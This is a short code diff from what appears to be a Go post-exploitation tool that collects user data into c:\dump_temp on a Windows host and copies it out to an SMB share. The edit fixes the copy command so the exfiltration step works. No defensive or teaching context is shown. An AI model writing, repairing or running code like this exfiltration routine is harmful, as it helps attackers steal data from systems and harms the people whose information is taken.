@@ -67,9 +67,9 @@ func main() {
 		fmt.Println("[*] Collecting users succesfull!")
 	}
 
-	fmt.Print("[*] Sending to share")
+	fmt.Print("[*] Sending to share\n")
 
-	s6 := exec.Command("cmd", "/c", "cp", "c:\\dump_temp\\*", smb)
+	s6 := exec.Command("cmd", "/c", "copy", "c:\\dump_temp\\*", smb)
     if err := s6.Run(); err != nil { 
         fmt.Println("[!] Error: ", err)
     }   else {
